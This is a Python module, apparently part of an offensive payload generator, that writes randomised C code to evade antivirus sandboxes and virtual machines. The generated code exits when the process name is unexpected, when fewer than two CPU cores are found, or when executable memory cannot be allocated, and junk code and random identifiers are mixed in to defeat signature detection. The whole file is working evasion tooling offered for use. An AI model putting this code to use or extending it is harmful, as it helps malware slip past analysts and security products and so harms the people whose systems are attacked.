from lib import core, junk
from random import shuffle


# Add Anti-VM code
def the_great_evasion(evasion, architecture, filename, junkcode, intensity):
    if evasion == "yes":
        evasion_funcname = ""
        evasion_func = ""
        evasion_list = [1, 2, 3]
        shuffle(evasion_list)
        for number in evasion_list:
            if number == 1:
                funcname, func = my_name_is(filename, junkcode, intensity)
                evasion_funcname += funcname
                evasion_func += func

            elif number == 2:
                funcname, func = number_of_core(junkcode, intensity)
                evasion_funcname += funcname
                evasion_func += func

            elif number == 3:
                if architecture == "x86":
                    pass
                else:
                    funcname, func = mono_core(junkcode, intensity)
                    evasion_funcname += funcname
                    evasion_func += func

        return evasion_funcname, evasion_func

    else:
        return "", ""


def replace_string(evasion_funcname):
    evasion_funcname = evasion_funcname.replace("void ", "").replace("void", "").replace("\n", "") + ";\n"
    return evasion_funcname


def my_name_is(filename, junkcode, intensity):
    evasion_funcname = "void " + core.varname_creator() + "(char *args)\n"

    b = core.varname_creator()
    filename = filename.replace('output/', '')
    evasion_func = evasion_funcname
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += 'if (strstr(args, "' + filename + '") > 0)\n'
    evasion_func += "{\n"
    evasion_func += "int " + b + " = 0;\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "}\n"
    evasion_func += "else"
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "exit(0);\n"
    evasion_func += "}\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "}\n\n"

    evasion_funcname = evasion_funcname.replace("(char *args)", "(argv[0])")
    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func


# Check number of core
def number_of_core(junkcode, intensity):
    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
    sysguide = core.varname_creator()
    xcore = core.varname_creator()

    evasion_func = evasion_funcname
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "SYSTEM_INFO " + sysguide + ";\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "GetSystemInfo(&" + sysguide + ");\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "int " + xcore + " = " + sysguide + ".dwNumberOfProcessors;\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "if (" + xcore + " < 2)\n"
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "exit(0);\n"
    evasion_func += "}\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "}\n\n"

    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func


# AV have no multiproc
def mono_core(junkcode, intensity):
    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
    mem2 = core.varname_creator()

    evasion_func = evasion_funcname
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "LPVOID " + mem2 + "= NULL;\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += mem2 + " = VirtualAllocEx(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "if (" + mem2 + " != NULL)\n"
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += 'printf("' + core.varname_creator() + '");\n'
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += '}\n'
    evasion_func += "else\n"
    evasion_func += "{\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "exit(0);\n"
    evasion_func += "}\n"
    evasion_func += junk.junk_inject(junkcode, "code", intensity)
    evasion_func += "}\n\n"

    evasion_funcname = replace_string(evasion_funcname)
    return evasion_funcname, evasion_func
